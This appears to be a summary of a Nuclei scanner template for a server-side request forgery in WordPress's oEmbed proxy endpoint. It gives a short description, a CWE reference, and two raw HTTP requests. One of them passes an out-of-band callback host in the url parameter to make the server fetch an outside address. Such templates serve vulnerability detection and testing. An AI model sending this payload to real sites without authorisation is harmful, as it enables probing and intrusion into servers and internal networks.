# Nuclei Template: Wordpress Oembed Proxy - Server-side request forgery
**Template ID:** wordpress-ssrf-oembed
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Medium
**CWE:** CWE-918
**Source:** Nuclei Template (`wordpress-ssrf-oembed.yaml`)

## Vulnerability Information & PoC

## Description
The oEmbed feature in WordPress allows embedding content from external sources, and if it's not properly secured, it could be exploited for SSRF.

## Steps to reproduce / Exploit Payload
```http
GET /wp-json/oembed/1.0/proxy HTTP/1.1
Host: {{Hostname}}

GET /wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
- https://github.com/incogbyte/quickpress/blob/master/core/req.go
